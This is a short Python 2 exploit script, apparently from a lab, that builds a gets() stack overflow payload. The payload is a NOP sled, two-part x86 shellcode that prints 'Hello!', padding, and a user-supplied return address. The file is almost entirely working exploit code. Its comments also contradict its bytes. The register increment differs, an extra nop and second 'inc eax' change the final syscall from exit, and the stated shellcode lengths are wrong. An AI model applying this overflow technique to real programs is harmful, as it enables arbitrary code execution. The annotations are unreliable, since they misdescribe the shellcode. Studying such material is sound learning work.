#!/usr/bin/env python2
import sys

if len(sys.argv) != 2:
    print('Usage: {prog} <ret address>'.format(prog=sys.argv[0]))
    sys.exit(1)


# This shellcode builder tries to reimplement example-shellcode2.S
# to allow printing newlines. What is the problem with newlines?
# When gets() reads input it reads it until newline or null byte. So if you want
# to print newlines, we need to put it last.
# The idea is that we can split 2 parts of shell code, putting part with string
# itself to the end, and put nops and return address in between.

# First part of shell code
# <_start>:
#     eb 5e                   jmp    <get_str_addr>
#
# <got_str_addr>:
#     59                      pop    %ecx
#     31 c0                   xor    %eax,%eax
#     31 db                   xor    %ebx,%ebx
#     31 d2                   xor    %edx,%edx
#     43                      inc    %ebx
#     04 04                   add    $0x4,%al
#     80 c2 06                add    $0x6,%dl
#     cd 80                   int    $0x80
#     31 c0                   xor    %eax,%eax
#     40                      inc    %eax
#     cd 80                   int    $0x80
#
# Note, that get_str_addr address accounts all the nops and stuff we have in between
shell1 = '\xeb\x5e\x59\x31\xc0\x31\xdb\x31\xd2\x43\x04\x04\x80\xc2\x07\xcd\x80\x31\xc0\x90\x40\x40\xcd\x80'

# Second part of shell code
#
#<get_str_addr>:
#   e8 a2 ff ff ff          call   <got_str_addr>
#   48 65 6c 6c 6f 21 0a    .ascii "Hello!\n"
#
# Note, the call address bytes a2 ff ff ff.
# It's a negative offset relative to the call instruction.
#
# The address itself, 0xffffffa2 is a 2s complement of -94, where -94 was
# calculated in gdb.
shell2 = '\xe8\xa2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x21\x0a'

# Shell code itself:
# 1. 20 bytes of nop sled
# 2. 22 bytes of first part of shell code that get string address in ecx by jmp to the
#    second part
# 3. 68 bytes padding
# 4. 4 bytes of the new return address pointing somewhere in nop sled
# 5. 10 bytes of second part of shell code, that must be last because gets stops on the
#    newline byte \x0a.
shellcode = '\x90'*20 + shell1 + 'A'*68 + sys.argv[1].decode('hex') + shell2

# Because Python 2 print function can't skip newline character
sys.stdout.write(shellcode)
